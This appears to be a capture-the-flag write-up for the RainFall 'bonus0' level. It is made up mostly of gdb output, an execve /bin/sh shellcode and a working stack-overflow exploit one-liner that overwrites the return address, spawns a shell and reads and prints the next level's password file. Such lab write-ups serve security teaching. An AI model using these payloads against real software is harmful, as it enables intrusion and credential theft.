Our goal is Overflowing a buffer and Overwriting the return address with our shellcode address 

```
    (gdb) run
    Starting program: /home/user/bonus0/bonus0 
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

    Program received signal SIGSEGV, Segmentation fault.
    0x41336141 in ?? ()
```

we have a segmentation fault in 0x41336141 so the ofsset is 29

```
    (gdb) b p
    Breakpoint 1 at 0x80484bd
    (gdb) r
    Starting program: /home/user/bonus0/bonus0 

    Breakpoint 1, 0x080484bd in p ()
    (gdb) disas p
    Dump of assembler code for function p:
    0x080484b4 <+0>:     push   ebp
    0x080484b5 <+1>:     mov    ebp,esp
    0x080484b7 <+3>:     sub    esp,0x1018
    => 0x080484bd <+9>:     mov    eax,DWORD PTR [ebp+0xc]
    0x080484c0 <+12>:    mov    DWORD PTR [esp],eax
    0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
    0x080484c8 <+20>:    mov    DWORD PTR [esp+0x8],0x1000
    0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
    0x080484d6 <+34>:    mov    DWORD PTR [esp+0x4],eax
    0x080484da <+38>:    mov    DWORD PTR [esp],0x0
    0x080484e1 <+45>:    call   0x8048380 <read@plt>
    0x080484e6 <+50>:    mov    DWORD PTR [esp+0x4],0xa
    0x080484ee <+58>:    lea    eax,[ebp-0x1008]
    0x080484f4 <+64>:    mov    DWORD PTR [esp],eax
    0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
    0x080484fc <+72>:    mov    BYTE PTR [eax],0x0
    0x080484ff <+75>:    lea    eax,[ebp-0x1008]
    0x08048505 <+81>:    mov    DWORD PTR [esp+0x8],0x14
    0x0804850d <+89>:    mov    DWORD PTR [esp+0x4],eax
    0x08048511 <+93>:    mov    eax,DWORD PTR [ebp+0x8]
    0x08048514 <+96>:    mov    DWORD PTR [esp],eax
    0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
    0x0804851c <+104>:   leave  
    0x0804851d <+105>:   ret    
    End of assembler dump.
    (gdb) x ebp-0x1008
    No symbol table is loaded.  Use the "file" command.
    (gdb) x $ebp-0x1008
    0xbfffe680:     0x00000000
    (gdb) x/40wx $ebp-0x1008
    0xbfffe680:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe690:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6a0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6b0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6c0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6d0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6e0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6f0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe700:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
    (gdb) ni
    0x080484c0 in p ()
    (gdb) ni
    0x080484c3 in p ()
    (gdb) ni
    - 
    0x080484c8 in p ()
    (gdb) ni
    0x080484d0 in p ()
    (gdb) ni
    0x080484d6 in p ()
    (gdb) ni
    0x080484da in p ()
    (gdb) ni
    0x080484e1 in p ()
    (gdb) ni
    AAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB
    0x080484e6 in p ()
    (gdb) x/40wx $ebp-0x1008
    0xbfffe680:     0x41414141      0x41414141      0x41414141      0x41414141
    0xbfffe690:     0x41414141      0x42414141      0x42424242      0x42424242
    0xbfffe6a0:     0x42424242      0x42424242      0x42424242      0x00000a42
    0xbfffe6b0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6c0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6d0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6e0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe6f0:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe700:     0x00000000      0x00000000      0x00000000      0x00000000
    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
```

This 0xbfffe710 is the address where the program will continue after returning from pp().
the return address is => 0xbfffe710 => \x10\xe7\xff\xbf

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

```
    (gdb) b p
    Breakpoint 1 at 0x80484bd
    (gdb) run
    Starting program: /home/user/bonus0/bonus0 
    Breakpoint 1, 0x080484bd in p ()
    (gdb) ni
    0x080484c0 in p ()
    (gdb) ni
    0x080484c3 in p ()
    (gdb) ni
    - 
    0x080484c8 in p ()
    (gdb) ni
    0x080484d0 in p ()
    (gdb) ni
    0x080484d6 in p ()
    (gdb) ni
    0x080484da in p ()
    (gdb) ni
    0x080484e1 in p ()
    (gdb) ni
    (python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
    0x080484e6 in p ()
    (gdb) x/40wx $ebp-0x1008
    0xbfffe680:     0x206e7572      0x283c203c      0x68747970      0x20336e6f
    0xbfffe690:     0x2720632d      0x6f706d69      0x73207472      0x203b7379
    0xbfffe6a0:     0x2e737973      0x6f647473      0x622e7475      0x65666675
    0xbfffe6b0:     0x72772e72      0x28657469      0x785c2262      0x2a223039
    0xbfffe6c0:     0x20303031      0x2262202b      0x6136785c      0x6230785c
    0xbfffe6d0:     0x3835785c      0x3939785c      0x3235785c      0x3836785c
    0xbfffe6e0:     0x6632785c      0x6632785c      0x3337785c      0x3836785c
    0xbfffe6f0:     0x3836785c      0x6632785c      0x3236785c      0x3936785c
    0xbfffe700:     0x6536785c      0x3938785c      0x3365785c      0x3133785c
    0xbfffe710:     0x3963785c      0x6463785c      0x3038785c      0x29272922
```

```
    bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"';python -c 'print "A"* 9 + "\x10\xe7\xff\xbf" + "B" * 7'; cat) | ./bonus0 
    - 
    - 
    ��������������������AAAAAAAAA���BBBBBBB��� AAAAAAAAA���BBBBBBB���
    cat /home/user/bonus1/.pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```